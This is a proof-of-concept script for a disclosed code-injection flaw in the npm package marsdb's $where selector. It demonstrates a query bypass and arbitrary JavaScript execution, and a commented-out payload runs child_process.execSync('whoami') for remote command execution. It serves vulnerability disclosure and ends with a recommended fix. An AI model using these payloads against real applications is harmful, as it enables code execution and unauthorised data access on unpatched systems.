/**
 * PoC: Arbitrary Code Execution via unsanitized $where selector in marsdb
 *
 * Vulnerability: GHSA-5mrr-rgp6-x4gr
 * Package:       marsdb <= 0.6.10 (npm)
 * Affected:      All versions (repository archived, no patch available)
 *
 * Root cause:
 *   DocumentMatcher.js:419
 *   selectorValue = Function('obj', 'return ' + selectorValue);
 *
 *   User-supplied $where string is concatenated directly into a Function()
 *   constructor with no sanitization or validation.
 *
 * Impact:
 *   - Node.js <= 18 : Full RCE via require('child_process')
 *   - Node.js >= 20 : ACE confirmed (arbitrary JS execution, auth bypass)
 *
 * Discovered using vulnscope: https://github.com/msh0625/vulnscope
 * Advisory PR: https://github.com/github/advisory-database/pull/7914
 *
 * Usage:
 *   npm install marsdb
 *   node marsdb-poc.js
 */

const Collection = require('marsdb').default;
const col = new Collection('users');

col.insert({ name: 'alice', role: 'user' });
col.insert({ name: 'bob',   role: 'user' });
col.insert({ name: 'admin', role: 'admin' });

console.log('[*] marsdb $where Arbitrary Code Execution PoC');
console.log('[*] GHSA-5mrr-rgp6-x4gr');
console.log('[*] Node.js version:', process.version);
console.log('');

// ── PoC 1: Authentication Bypass ──────────────────────────────────────────
// $where: "1 === 1" always evaluates to true, returning all documents
// regardless of other query conditions.
col.find({ $where: "1 === 1" }).then(result => {
  console.log('[+] PoC 1 — Authentication Bypass');
  console.log('    $where: "1 === 1" matched all docs:', JSON.stringify(result));
  console.log('');
});

// ── PoC 2: Arbitrary JS Execution ─────────────────────────────────────────
// Arbitrary JavaScript executes inside Function() constructor scope.
col.find({
  $where: "(function(){ global._poc2 = 'arbitrary_js_executed_at_' + Date.now(); return true; })()"
}).then(result => {
  console.log('[+] PoC 2 — Arbitrary JS Execution');
  console.log('    Result:', global._poc2);
  console.log('    Matched docs:', result.length);
  console.log('');
});

// ── PoC 3: Full RCE (Node.js <= 18) ───────────────────────────────────────
// On Node.js <= 18, require() is accessible inside Function() scope,
// enabling OS command execution via child_process.
//
// Uncomment to test on Node.js <= 18:
//
// col.find({
//   $where: "require('child_process').execSync('whoami').toString()"
// }).then(result => {
//   console.log('[+] PoC 3 — Full RCE (Node.js <= 18)');
//   console.log('    Command output:', result);
// });

console.log('[*] Vulnerable line: DocumentMatcher.js:419');
console.log("    selectorValue = Function('obj', 'return ' + selectorValue)");
console.log('');
console.log('[*] Recommended fix:');
console.log('    Reject string input for $where — accept Function type only.');
console.log('    Or disable $where entirely.');
